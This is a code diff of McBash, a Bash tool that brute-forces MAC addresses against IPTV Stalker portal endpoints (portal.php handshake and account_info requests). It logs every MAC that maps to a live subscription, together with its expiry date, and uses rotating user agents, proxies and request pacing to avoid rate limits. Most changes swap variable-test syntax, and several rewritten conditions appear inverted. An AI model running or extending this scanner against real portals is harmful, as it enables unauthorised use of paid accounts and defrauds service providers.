@@ -1,6 +1,8 @@
 #!/bin/bash
 #
 
+#set -xe
+
 _RED=$(tput setaf 1)
 _GREEN=$(tput setaf 2)
 _YELLOW=$(tput setaf 3)
@@ -18,7 +20,7 @@ for (( i=0;i<$ELEMENTS;i++)); do
 		only_outputs_mac=true
 done
 
-[[ ! -v only_outputs_mac ]] && \
+[[ -n ${only_outputs_mac} ]] || \
 	echo ${_GREEN} " ░█▄▒▄█░▄▀▀░██▄▒▄▀▄░▄▀▀░█▄█ " ${_RESET} && \
 	echo ${_GREEN} " ░█▒▀▒█░▀▄▄▒█▄█░█▀█▒▄██▒█▒█ " ${_RESET}
 
@@ -120,68 +122,84 @@ done
 
 # Declaring functions
 dns_name() {
-	[[ ! -v dns || $dns == "" ]] && read -p "Server address : "${_BOLD}${_BLUE} dns
-	[[ ! -v only_outputs_mac ]] && tput sgr0 # can't place _RESET here due to last 'read' command. Help?
-	[[ $dns = "" ]] && echo -ne "\r${_RED}You need to indicate a server address [ex: my-fakedns.org:8080]${_RESET}\n" && dns_name
+	[[ -z ${dns+x} ]] && read -p "Server address : "${_BOLD}${_BLUE} dns
+	[[ -n ${only_outputs_mac} ]] && tput sgr0 # can't place _RESET here due to last 'read' command. Help?
+	#tput sgr0 # can't place _RESET here due to last 'read' command. Help?
+	[[ $dns = "" ]] && unset dns && echo -ne "\r${_RED}You need to indicate a server address [ex: my-fakedns.org:8080]${_RESET}\n" && dns_name
 	[[ $(echo $dns | grep -o 'http://') = "" ]] && dns=$(echo 'http://'$dns)
 	dns=$(echo $dns | sed 's/\/$//') # if trailing "/" at the end of DNS, remove it
 }
 
 parameters() {
 	if [ "$avoid_parameters" = true ]; then
-		[[ ! -v request_delay ]] && request_delay=$default_request_delay
-		[[ ! -v timebreak_duration ]] && timebreak_duration=$default_timebreak_duration
-		[[ ! -v timeout ]] && timeout=$default_timeout
-		if [[ -v range ]]; then
-			[[ ! -v range_from ]] && range_from=$default_first_mac
-			[[ ! -v range_to ]] && range_to=$default_last_mac
+		[[ -n ${request_delay} ]] || request_delay=$default_request_delay
+		[[ -n ${timebreak_duration} ]] || timebreak_duration=$default_timebreak_duration
+		[[ -n ${timeout} ]] || timeout=$default_timeout
+		if [[ -n ${range} ]]; then
+			[[ -n ${range_from} ]] || range_from=$default_first_mac
+			[[ -n ${range_to} ]] || range_to=$default_last_mac
 		fi
 	fi
-	[[ ! -v request_delay && \
-		! -v timebreak && \
-		! -v timebreak_duration && \
-		! -v stopping && \
-		! -v timeout && \
-		! -v keep_expired ]] && \
+	#echo ${request_delay}
+	#echo $timebreak
+	#echo $timebreak_duration
+	#echo $stopping
+	#echo $timeout
+	#echo $keep_expired
+	[[ -z ${request_delay+x} && \
+		-z ${timebreak+x} && \
+		-z ${timebreak_duration+x} && \
+		-z ${stopping+x} && \
+		-z ${timeout+x} && \
+		-z ${keep_expired+x} ]] && \
 		read -p "${_BOLD}=>${_RESET} Set parameters? ${_BOLD}[y/N]${_RESET} " parametres
 	if [[ $(echo $parametres | grep -io "y") == "y" ]]; then
-		[[ ! -v request_delay ]] && read -p " ${_BOLD}*${_RESET} Wait ${_GREEN}[X] ${_RESET}seconds between two requests ${_BOLD}[default:$default_request_delay]${_RESET} ${_BOLD}${_GREEN}" request_delay
+		[[ -z ${request_delay+x} ]] && read -p " ${_BOLD}*${_RESET} Wait ${_GREEN}[X] ${_RESET}seconds between two requests ${_BOLD}[default:$default_request_delay]${_RESET} ${_BOLD}${_GREEN}" request_delay
 		[[ $request_delay == "" ]] && request_delay=$default_request_delay
-		[[ ! -v timebreak ]] && read -p "${_RESET} ${_BOLD}*${_RESET} Make a break every ${_GREEN}[X]${_RESET} requests ${_BOLD}[$default_timebreak]${_RESET} ${_BOLD}${_GREEN}" timebreak
+		[[ -z ${timebreak+x} ]] && read -p "${_RESET} ${_BOLD}*${_RESET} Make a break every ${_GREEN}[X]${_RESET} requests ${_BOLD}[$default_timebreak]${_RESET} ${_BOLD}${_GREEN}" timebreak
 		[[ $timebreak == "" ]] && timebreak=$default_timebreak && [[ $timebreak == "0" ]] && unset timebreak
-		[[ ! -v timebreak_duration && $timebreak != "" ]] && read -p "${_RESET} ${_BOLD}*${_RESET} Break duration (seconds) ${_BOLD}[$default_timebreak_duration]${_RESET} ${_BOLD}${_GREEN}" timebreak_duration
+		[[ -z ${timebreak_duration+x} && $timebreak != "" ]] && read -p "${_RESET} ${_BOLD}*${_RESET} Break duration (seconds) ${_BOLD}[$default_timebreak_duration]${_RESET} ${_BOLD}${_GREEN}" timebreak_duration
 		[[ $timebreak_duration == "" ]] && timebreak_duration=$default_timebreak_duration
-		[[ ! -v stopping ]] && read -p "${_RESET} ${_BOLD}*${_RESET} Stop McBash after ${_GREEN}[X]${_RESET} tested MAC addresses ${_BOLD}[$default_stopping]${_RESET} ${_BOLD}${_GREEN}" stopping
+		[[ -z ${stopping+x} ]] && read -p "${_RESET} ${_BOLD}*${_RESET} Stop McBash after ${_GREEN}[X]${_RESET} tested MAC addresses ${_BOLD}[$default_stopping]${_RESET} ${_BOLD}${_GREEN}" stopping
 		[[ $stopping == "" ]] && stopping=$default_stopping && [[ $stopping == "0" ]] && unset stopping
-		[[ ! -v timeout ]] && read -p "${_RESET} ${_BOLD}*${_RESET} Consider request a timeout after ${_GREEN}[X]${_RESET} seconds ${_BOLD}[$default_timeout]${_RESET} ${_BOLD}${_GREEN}" timeout
+		[[ -z ${timeout+x} ]] && read -p "${_RESET} ${_BOLD}*${_RESET} Consider request a timeout after ${_GREEN}[X]${_RESET} seconds ${_BOLD}[$default_timeout]${_RESET} ${_BOLD}${_GREEN}" timeout
 		[[ $timeout == "" ]] && timeout=$default_timeout
-		[[ -v range ]] && echo -e "${_RESET} ${_BOLD}*${_RESET} You have set ${_GREEN}range mode${_RESET}"
-		[[ -v range && ! -v range_from ]] && read -p "${_RESET} ${_BOLD}->${_RESET} Indicate first MAC to scan ${_BOLD}[$default_first_mac]${_RESET} ${_BOLD}${_GREEN}" first_mac
-		[[ $first_mac == "" ]] && unset first_mac
-		[[ -v range && ! -v range_to ]] && read -p "${_RESET} ${_BOLD}->${_RESET} Indicate last MAC to scan ${_BOLD}[$default_last_mac]${_RESET} ${_BOLD}${_GREEN}" last_mac
-		[[ $last_mac == "" ]] && last_mac="$default_last_mac"
-		[[ ! -v keep_expired ]] && read -p "${_RESET} ${_BOLD}*${_RESET} Store expired MAC addresses (tagged as such)? ${_BOLD}[y/N]${_RESET} " keep_expired
+		[[ -n ${range} ]] && echo -e "${_RESET} ${_BOLD}*${_RESET} You have set ${_GREEN}range mode${_RESET}"
+		[[ -n ${range} && -z ${range_from+x} ]] && read -p "${_RESET} ${_BOLD}->${_RESET} Indicate first MAC to scan ${_BOLD}[$default_first_mac]${_RESET} ${_BOLD}${_GREEN}" first_mac
+		#[[ -z $first_mac == "" ]] && unset first_mac
+		[[ -z ${first_mac} ]] && first_mac=$default_first_mac # TODO rechange ? line above
+		[[ -n ${range} && -z ${range_to+x} ]] && read -p "${_RESET} ${_BOLD}->${_RESET} Indicate last MAC to scan ${_BOLD}[$default_last_mac]${_RESET} ${_BOLD}${_GREEN}" last_mac
+		#[[ $last_mac == "" ]] && last_mac="$default_last_mac"
+		[[ -z ${last_mac} ]] && last_mac=$default_last_mac # TODO rechange ? line above
+		[[ -n ${keep_expired} ]] || read -p "${_RESET} ${_BOLD}*${_RESET} Store expired MAC addresses (tagged as such)? ${_BOLD}[y/N]${_RESET} " keep_expired
 		( [[ $keep_expired == "" || $(echo $keep_expired | grep -io "n") == "n" || $(echo $keep_expired | grep -io "n") == "N" ]] ) && unset keep_expired
 		echo " ${_RESET}"
-	elif [[ -v range && ( ! -v range_from || ! -v range_to ) ]]; then
-		[[ ! -v range_from ]] && read -p "${_RESET} ${_BOLD}->${_RESET} Indicate first MAC to scan ${_BOLD}[$default_first_mac]${_RESET} ${_BOLD}${_GREEN}" first_mac
-		[[ $first_mac == "" ]] && unset first_mac
-		[[ ! -v range_to ]] && read -p "${_RESET} ${_BOLD}->${_RESET} Indicate last MAC to scan ${_BOLD}[$default_last_mac]${_RESET} ${_BOLD}${_GREEN}" last_mac
-		[[ $last_mac == "" ]] && last_mac="$default_last_mac"
-		[[ ! -v request_delay ]] && request_delay=$default_request_delay
-		[[ ! -v timebreak_duration ]] && timebreak_duration=$default_timebreak_duration
-		[[ ! -v timeout ]] && timeout=$default_timeout
-		if [[ -v range ]]; then
-			[[ ! -v range_from ]] && range_from=$default_first_mac
-			[[ ! -v range_to ]] && range_to=$default_last_mac
-		fi
+	elif [[ -n ${range} || -n ${range_from} || -n ${range_to} ]]; then
+		[[ -n ${range_from} ]] || read -p "${_RESET} ${_BOLD}->${_RESET} Indicate first MAC to scan ${_BOLD}[$default_first_mac]${_RESET} ${_BOLD}${_GREEN}" first_mac
+		[[ -n ${range_from} ]] && first_mac=$range_from
+		#[[ $first_mac == "" ]] && unset first_mac
+		[[ -z ${first_mac} ]] && first_mac=$default_first_mac && range_from="$default_first_mac" # TODO rechange ? line above
+		[[ -n ${first_mac} ]] && range_from=$first_mac # TODO rechange ? line above
+
+		[[ -n ${range_to} ]] || read -p "${_RESET} ${_BOLD}->${_RESET} Indicate last MAC to scan ${_BOLD}[$default_last_mac]${_RESET} ${_BOLD}${_GREEN}" last_mac
+		[[ -n ${range_to} ]] && last_mac=$range_to
+		[[ -z $last_mac ]] && last_mac="$default_last_mac" && range_to="$default_last_mac"
+		[[ -n ${last_mac} ]] && range_to=$last_mac # TODO rechange ? line above
+
+		[[ -n ${request_delay} ]] || request_delay=$default_request_delay
+		[[ -n ${timebreak_duration} ]] || timebreak_duration=$default_timebreak_duration
+		[[ -n ${timeout} ]] || timeout=$default_timeout
+		#[[ -n ${range_from} ]] || range_from=$default_first_mac
+		#[[ -n ${range_to} ]] || range_to=$default_last_mac
 	else
-		[[ ! -v request_delay ]] && request_delay=$default_request_delay
-		[[ ! -v timebreak_duration ]] && timebreak_duration=$default_timebreak_duration
-		[[ ! -v timeout ]] && timeout=$default_timeout
-		if [[ -v range ]]; then
-			[[ ! -v range_from ]] && range_from=$default_first_mac
-			[[ ! -v range_to ]] && range_to=$default_last_mac
+		[[ -n ${request_delay} ]] || request_delay=$default_request_delay
+		[[ -n ${timebreak} ]] || timebreak=$default_timebreak # TODO REMOVE ?
+		[[ -n ${timebreak_duration} ]] || timebreak_duration=$default_timebreak_duration
+		[[ -n ${timeout} ]] || timeout=$default_timeout
+		if [[ -n ${range} || -n ${range_from} || -n ${range_to} ]]; then
+			range=True
+			[[ -n ${range_from} ]] || range_from=$default_first_mac && first_mac=$default_first_mac
+			[[ -n ${range_to} ]] || range_to=$default_last_mac && last_mac=$default_last_mac
 		fi
 		return
 	fi
@@ -208,11 +226,11 @@ random_mac() {
 }
 
 range_mac() {
-	[[ -v last_mac_reached ]] && \
-		( [[ -v only_outputs_mac ]] || echo "${_BOLD}${_CYAN}Range fullfiled${_RESET}" ) && \
+	[[ -n ${last_mac_reached} ]] && \
+		( [[ -n ${only_outputs_mac} ]] || echo "${_BOLD}${_CYAN}Range fullfiled${_RESET}" ) && \
 		exit 0
-	[[ ! -v first_mac && -v range_from ]] && first_mac=$range_from && mac=$(echo $first_mac) && return # user first value of the MAC
-	[[ ! -v first_mac ]] && first_mac="$default_first_mac" && mac=$(echo $first_mac) && return # user first value of the MAC
+	#[[ -n ${first_mac} && -z ${range_from+x} ]] && first_mac=$range_from && mac=$(echo $first_mac) && return # user first value of the MAC
+	[[ -z ${first_mac+x} ]] && first_mac="$default_first_mac" && mac=$(echo $first_mac) && return # user first value of the MAC
 	[[ $item == 1 ]] && mac=$(echo $first_mac) && return
 	new_mac=$(echo $first_mac)
 	mac_simple=$(echo $new_mac |  tr '[:lower:]' '[:upper:]' | tr -d ':') && \
@@ -222,34 +240,34 @@ range_mac() {
 		new_mac=$(echo $mac_hex | sed 's/../&:/g;s/:$//') && \
 		first_mac=$(echo $new_mac) && \
 		mac=$(echo $new_mac) && \
-		[[ -v last_mac && $last_mac == $mac ]] && last_mac_reached=True
+		[[ -z ${last_mac+x} && $last_mac == $mac ]] && last_mac_reached=True
 		return
 }
 
 handshaking() {
-	if [[ -v last_request_timedout ]]; then
+	if [[ -n ${last_request_timedout} ]]; then
 		unset last_request_timedout
 	else
 		item=$(( $item + 1 ))
-		[[ -v stopping ]] && [[ $(( $item - 1 )) == $stopping ]] && \
-			( [[ -v only_outputs_mac ]] || \
+		[[ -n ${stopping} ]] && [[ $(( $item - 1 )) == $stopping ]] && \
+			( [[ -n ${only_outputs_mac} ]] || \
 			echo ${_BOLD}${_CYAN}"$(( $item - 1 )) checked, $valid_macs_number valid. Stopping."${_RESET} ) && \
 			exit 0
-		[[ $item == 1 ]] || ( [[ -v timebreak ]] && \
+		[[ $item == 1 ]] || ( [[ -z ${timebreak+x} ]] && \
 			[[ $(expr $(( $item - 1 )) % $timebreak ) == 0 ]] && \
-			( [[ -v only_outputs_mac ]] || echo -ne ${_BLUE}"\r[$(( $item - 1 ))] $mac ${_RESET}${_CYAN}--- Pausing for $timebreak_duration seconds..."${_RESET} ) && \
+			( [[ -z ${only_outputs_mac+x} ]] || echo -ne ${_BLUE}"\r[$(( $item - 1 ))] $mac ${_RESET}${_CYAN}--- Pausing for $timebreak_duration seconds..."${_RESET} ) && \
 			sleep $timebreak_duration ) || \
 			sleep $request_delay
-		[[ -v range ]] && range_mac
-		[[ ! -v range ]] && random_mac
+		[[ -n ${range} ]] && range_mac
+		[[ -z ${range+x} ]] && random_mac
 	fi
 	handshake_url=$(echo $dns)'/portal.php?action=handshake&type=stb&token=&mac='$(echo $encoded_mac)
 	cookie="mac=$mac; stb_lang=en; timezone=Europe/Amsterdam; "
 	random_user_agent
-	handshake_token=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Cookie: $(echo $cookie)" "$(echo $handshake_url)"); if [ $? -eq 28 ]; then timeout_number=$(( $timeout_number + 1 )) && last_request_timedout=true && ( [[ -v only_outputs_mac ]] || echo -ne "\r\033[0KTimeout [$timeout_number]. New attempt in $timebreak_duration seconds." ) && sleep $timebreak_duration && ( [[ -v only_outputs_mac ]] || echo -ne "\r\033[0K\r\033[0KNew attempt..." ) && return; fi
+	handshake_token=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Cookie: $(echo $cookie)" "$(echo $handshake_url)"); if [ $? -eq 28 ]; then timeout_number=$(( $timeout_number + 1 )) && last_request_timedout=true && ( [[ -n ${only_outputs_mac} ]] || echo -ne "\r\033[0KTimeout [$timeout_number]. New attempt in $timebreak_duration seconds." ) && sleep $timebreak_duration && ( [[ -n ${only_outputs_mac} ]] || echo -ne "\r\033[0K\r\033[0KNew attempt..." ) && return; fi
 	handshake_token=$(echo $handshake_token| grep -o '"token".*' | sed 's/\"token\":// ; s/\}\}//')
-	[[ $handshake_token = "" ]] && ( [[ -v only_outputs_mac ]] || echo -ne "\r\033[0K$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}" ) && return # [empty]
-	[[ $(echo $handshake_token | grep null) ]] && ( [[ -v only_outputs_mac ]] || echo -ne "\r\033[0K$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}" ) && return # [empty]
+	[[ $handshake_token = "" ]] && ( [[ -n ${only_outputs_mac} ]] || echo -ne "\r\033[0K$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}" ) && return # [empty]
+	[[ $(echo $handshake_token | grep null) ]] && ( [[ -n ${only_outputs_mac} ]] || echo -ne "\r\033[0K$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}" ) && return # [empty]
 	authorization='Bearer '$(echo $handshake_token)
 	profile_url=$(echo $dns)'/portal.php?type=account_info&action=get_main_info&mac='$(echo $mac)
 	profile=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $profile_url)")
@@ -257,31 +275,31 @@ handshaking() {
 		maybeGEN1portal=true && \
 		profile_url=$(echo $dns)'/portal.php?type=stb&action=get_profile&JsHttpRequest=1-xml='$(echo $mac) && \
 		profile=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $profile_url)")
-		[[ $profile == "" ]] && unset maybeGEN1portal && ( [[ -v only_outputs_mac ]] || echo -ne "\r\033[0K$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}" ) && return # test
-	[[ -v maybeGEN1portal ]] && \
+		[[ $profile == "" ]] && unset maybeGEN1portal && ( [[ -n ${only_outputs_mac} ]] || echo -ne "\r\033[0K$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}" ) && return # test
+	[[ -z ${maybeGEN1portal+x} ]] && \
 		account_url=$(echo $dns)'/portal.php?type=account_info&action=get_main_info&mac='$(echo $mac) && \
 		account=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $account_url)") && \
 		[[ ! $account == "" ]] && \
 		profile=$account
 	expiration_date=$(echo $profile | grep -o "\"phone\":\".*\"" | sed 's/\"phone\":\"//' | sed 's/\".*//')
-	[[ -z $expiration_date && ! -v keep_expired ]] && \
-		( [[ -v only_outputs_mac ]] || echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}" ) && \
+	[[ -z ${expiration_date} && -z ${keep_expired+x} ]] && \
+		( [[ -n ${only_outputs_mac} ]] || echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}" ) && \
 		return
-	[[ -z $expiration_date && -v keep_expired ]] && \
-		( [[ -v only_outputs_mac ]] || echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}\n" ) && \
+	[[ -z ${expiration_date} && -n ${keep_expired} ]] && \
+		( [[ -n ${only_outputs_mac} ]] || echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}\n" ) && \
 		( if [[ $valid_macs_number == 0 ]]; then echo -e "\n$dns ($(date))\n" >> $destination/valid_macs_$name; fi ) && \
 		echo "$mac [expired]" >> $destination/valid_macs_$name && \
 		return
 	[[ $valid_macs_number == 0 ]] && echo -e "\n$dns ($(date))\n" >> $destination/valid_macs_$name
 	echo "$mac [$expiration_date]" >> $destination/valid_macs_$name
-	( ( [[ -v only_outputs_mac ]] && echo $mac ) || \
+	( ( [[ -n ${only_outputs_mac} ]] && echo $mac ) || \
 		echo -ne "\r${_BOLD}${_GREEN}[$item] $mac ${_RESET}${_RED}[$expiration_date] ${_RESET}\n" )
 	valid_macs_number=$(( $valid_macs_number + 1 ))
 	unset maybeGEN1portal
 }
 
 quit_mcbash() {
-	[[ -v only_outputs_mac ]] && exit 0
+	[[ -n ${only_outputs_mac} ]] && exit 0
 	echo ""
 	[[ $valid_macs_number != 0 ]] && echo ${_GREEN}"$valid_macs_number valid for $(( $item - 1 )) tested." ${_RESET}
 	echo ${_CYAN}--- You have paused mcbash. What to do ? ---${_RESET}
@@ -299,13 +317,16 @@ quit_mcbash() {
 dns_name
 parameters
 
-[[ ! -v request_delay ]] && request_delay=2
-[[ ! -v timebreak_duration ]] && timebreak_duration=10
-[[ ! -v timeout ]] && timeout=5
-[[ -v range_from ]] && range=True #first_mac=$range_from
-[[ -v range_to ]] && range=True && last_mac=$range_to
+[[ -n ${request_delay} ]] || request_delay=2 # should grab default parameters in config TODO
+[[ -n ${timebreak} ]] || timebreak=0 # same #TODO
+[[ -n ${timebreak_duration} ]] || timebreak_duration=10 # same #TODO
+[[ -n ${timeout} ]] || timeout=5 # same #TODO
+[[ -n ${range_from} ]] && range=True && first_mac=$range_from # TODO
+[[ -n ${range_to} ]] && range=True && last_mac=$range_to
 
-[[ ! -v only_outputs_mac ]] && \
+#echo "Range?  $range , $range_from , $range_to ; $first_mac ; $last_mac"
+
+[[ -n ${only_outputs_mac} ]] || \
 	echo "${_BOLD}=> ${_RESET}Scan @ ${_BOLD}${_BLUE}$dns${_RESET} ${_GREEN}[$request_delay seconds/request]${_RESET}"
 
 name=$(echo $dns | sed 's/http:\/\///' | sed 's/://;s/\///')
